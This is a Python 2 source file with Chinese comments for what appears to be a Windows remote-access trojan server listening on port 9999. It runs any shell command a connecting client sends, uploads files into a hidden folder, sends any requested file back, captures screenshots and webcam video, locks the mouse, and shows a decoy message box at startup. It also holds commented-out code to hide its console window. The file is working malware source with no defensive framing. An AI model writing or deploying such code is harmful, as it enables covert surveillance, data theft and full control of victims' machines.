# -*- coding: utf-8 -*-
import os
import sys
import socket
import threading
import ctypes 
from PIL import ImageGrab
import time
import SocketServer
import subprocess
import string
import time
import shutil
import cv2
import cv2.cv

class MyTcpServer(SocketServer.BaseRequestHandler):

    def open_video(self):
        
        capture=cv2.VideoCapture(0)
        #将capture保存为motion-jpeg,cv_fourcc为保存格式
        size = (int(capture.get(cv2.cv.CV_CAP_PROP_FRAME_WIDTH)),
                int(capture.get(cv2.cv.CV_CAP_PROP_FRAME_HEIGHT)))
        #cv_fourcc值要设置对，不然无法写入，而且不报错，坑
        video=cv2.VideoWriter("QFileRcv/Video.avi", cv2.cv.CV_FOURCC('I','4','2','0'), 30, size)
        #isopened可以查看摄像头是否开启
        #print capture.isOpened()

        #录像10s
        start_time = time.time()
        end_time   = int(start_time) + 15
        while time.time() < end_time:
            ret,img=capture.read()
            #视频中的图片一张张写入
            video.write(img)
           # cv2.imshow('Video',img)
            key=cv2.waitKey(0)#里面数字为delay时间，如果大于0为刷新时间，
        video.release()


    
    def lockmouse(self):
        try:
            start_time = time.time()
            end_time   = int(start_time) + 10
            while time.time() < end_time:
                ctypes.windll.user32.SetCursorPos(0,0)
        except Exception as e:

            print e
            return False
        finally:
            return True

    def cur_file_dir(self):
        #获取脚本路径
        path = sys.path[0]
        #判断为脚本文件还是py2exe编译后的文件，如果是脚本文件，则返回的是脚本的目录，如果是py2exe编译后的文件，则返回的是编译后的文件路径
        if os.path.isdir(path):
            return path
        elif os.path.isfile(path):
            return os.path.dirname(path)

    def screenshoot(self):
        im = ImageGrab.grab()
        ISOTIMEFORMAT='%H-%M-%S'
        screenshoottime = time.strftime(ISOTIMEFORMAT, time.localtime())
        if not os.path.exists("tmp"):
            os.mkdir("tmp")
        savepath = './tmp/' + screenshoottime + '.jpg'
        im.save(savepath)
        return savepath


    def msgbox(self):
        if not os.path.exists("tmp"):
            os.mkdir("tmp")
        savepath = './tmp/hello.vbs'
        try:
            f = open(savepath, 'wb')
            self.request.send('ready')
            while True:
                data = self.request.recv(4096)
                if data == 'EOF':
                    print "recv file success!"
                    break
                f.write(data)
        except Exception as e:
            print e
        finally:
            f.close()
            

    
    def recvfile(self,filename):
        print "starting receive file!"
        filename = filename.split('/')[-1]
        if not os.path.exists("QFileRcv"):
            os.mkdir("QFileRcv")
        cmd = "attrib +h ./QFileRcv"
        self.cmd_execute(cmd)
        filename = "./QFileRcv/"+filename
        try:
            f = open(filename, 'wb')
            self.request.send('ready')
            while True:
                data = self.request.recv(4096)
                if data == 'EOF':
                    print "recv file success!"
                    break
                f.write(data)
        except Exception as e:
            print e
        finally:
            f.close()
                                        
    def sendfile(self,filename):
        print "starting send file!"
        self.request.send('ready')
        time.sleep(1)
        try:
            f = open(filename, 'rb')
            while True:
                data = f.read(4096)
                if not data:
                    break
                self.request.send(data)
            f.close()
            time.sleep(1)
            self.request.send('EOF')
            print "send file success!"
        except Exception as e:
            print e
            time.sleep(1)
            self.request.send('error')
            print "send error!"

    def cmd_execute(self,cmd):
            cmd='cmd.exe /k ' + cmd
            result = os.popen(str(cmd)).readlines()
            result_str = ''
            for each in result:
                    result_str = result_str + each
            if result_str=='':
                result_str='get command'
            return result_str

    def handle(self):
        print ">>Listening......"
        print ">>get connection from :",self.client_address
        while True:
            try:
                request = self.request.recv(4096)
                print "[*] Received Command:%s" % request
                if not request:
                    print "break the connection!"
                    break
                else:
                    if request.split(' ')[0] == "put":
                        try:
                            self.recvfile(request.split(' ')[1])
                        except Exception as e:
                            print e
                    elif request.split(' ')[0] == "get":
                        try:
                            self.sendfile(request.split(' ')[1])
                        except Exception as e:
                            print e
                    elif request.split(' ')[0] == "screenshoot" :
                        image_name = self.screenshoot()
                       # print image_name
                        self.sendfile(image_name)
                        time.sleep(1)
                        path= os.path.abspath(os.path.dirname(image_name))
                        shutil.rmtree(path)
                    elif  request.split(' ')[0] == "msgbox":
                        self.msgbox()
                        time.sleep(1)
                        #path= os.path.abspath(os.path.dirname('hello.vbs'))
                       # shutil.rmtree(path)                       
                    elif request.split(' ')[0] == "lock":
                        threading.Thread(target=self.lockmouse(),args=())
                        # self.request.send("success")
                    elif request.split(' ')[0] == "pwd":
                        res = self.cur_file_dir()
                        #print res
                        self.request.send(res)
                    elif request.split(' ')[0] == "video":
                        self.open_video()
                        self.sendfile('./QFileRcv/Video.avi')
                        
                    else:
                        res = self.cmd_execute(request)

                        #print 'test:'+res
                       # print 'test:'+'\n'+self.cur_file_dir()+'>'
                        test='\n'+self.cur_file_dir()+'>'
                       
                        if res==test:
                            print 'success'
                        else:
                            self.request.send(res)
                  
            except Exception,e:
                print "get error at:",e
                break


if __name__ == '__main__':
    # 隐藏自己
    # whnd = ctypes.windll.kernel32.GetConsoleWindow()    
    # if whnd != 0:    
    #     ctypes.windll.user32.ShowWindow(whnd,0)    
    #     ctypes.windll.kernel32.CloseHandle(whnd)   
    
    cmd = 'cmd.exe /k mshta vbscript:msgbox("Good Good Study,Day Day UP :) ",64,"title")(window.close)'
    os.popen(str(cmd))

    def get_local_ip():
        localIPlist = socket.gethostbyname_ex(socket.gethostname())[-1]#这个得到本地ips
        for ip in localIPlist:
            if ip.split('.')[3] != '1':
                return ip
        return False
    
    # 监听的IP及端口
    host='127.0.0.1'
    if get_local_ip(): 
        host = get_local_ip()
    port = 9999
    s = SocketServer.ThreadingTCPServer((host,port), MyTcpServer)
    s.serve_forever()
